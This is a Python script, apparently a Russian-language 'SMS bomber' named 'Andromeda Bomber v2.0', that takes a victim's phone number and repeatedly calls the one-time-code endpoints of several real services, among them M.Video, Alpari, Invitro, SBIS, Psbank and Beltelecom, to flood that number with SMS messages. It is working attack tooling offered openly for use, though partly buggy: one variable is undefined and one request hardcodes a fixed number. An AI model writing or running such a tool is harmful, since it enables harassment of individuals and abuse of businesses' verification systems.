#!/usr/bin/python
class spymer:
	def main(self):
		import requests, random, datetime, sys, time, argparse
		from colorama import Fore, Back, Style
		print("Andromeda Bomber v2.0")
		parser = argparse.ArgumentParser(prog='spymer', description="Возможно что-то уже не работает. Только для России!")
		parser.add_argument('phonenum', metavar='phone', help='Телефонный номер жертвы (пример: 79991234455)')
		args = parser.parse_args()
		def showstatus(message, type='new'):
			now = datetime.datetime.now().strftime('%H:%M:%S')
			icon = '*'
			if type == 'warn':
				icon = '!'
			else:
				if type == 'new':
					icon == '*'
			message = '[' + icon + '][' + now + ']' + message
			return message
		def wrapsbrace(string, endspace=False):
			if endspace == True:
				return '[' + string + '] '
			return '[' + string + ']'
		def sleep(x):
			try:
				time.sleep(x)
			except KeyboardInterrupt:
				print('\r' + showstatus(wrapsbrace('except', True) + 'KeyboardInterrupt thrown! Exiting . . .', 'warn'))
				exit()
		_phone = args.phonenum
		if _phone[0] == '+':
			_phone = _phone[1:]
		if _phone[0] == '8':
			_phone = '7'+_phone[1:]
		if _phone[0] == '9':
			_phone = '7'+_phone
		
		_name = ''
		for x in range(12):
			_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		iteration = 0			
		_phone9 = _phone[1:]
		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
		print(showstatus(wrapsbrace('info', True) + ('Отправка SMS на: +{}').format(_phone)))
		print('Атака запущена. \nЕсли Вы хотите остановить - нажмите Ctrl+Z.')
		i = 1
		iteration = 0
		while i < 10:
#			pswallet = requests.get('https://api.pswallet.ru/system/smsCode', params={'mobile': _phone, 'type': '0'})
#			privetmir = requests.post('https://api-user.privetmir.ru/api/v2/send-code', data={'login': '9153509908','scope': 'register-user reset-password','checkApproves': 'Y','approve1': 'on','approve2': 'on','code': ''})
			mvideo = requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': '+7 915 3509908','g-recaptcha-response': '','recaptcha': 'on'})
#			loginmos = requests.post('https://login.mos.ru/sps/recovery/start', json={"login":_phone,"attr":""})
			alpari = requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
			invitro = requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
			onlinesbis = requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
			psbank = requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
#			raiffeisen = requests.get('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code', params={'number':_phone})
			beltelecom = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
			iteration += 1
			print(('{} круг пройден.').format(iteration))

spammer = spymer()
spammer.main()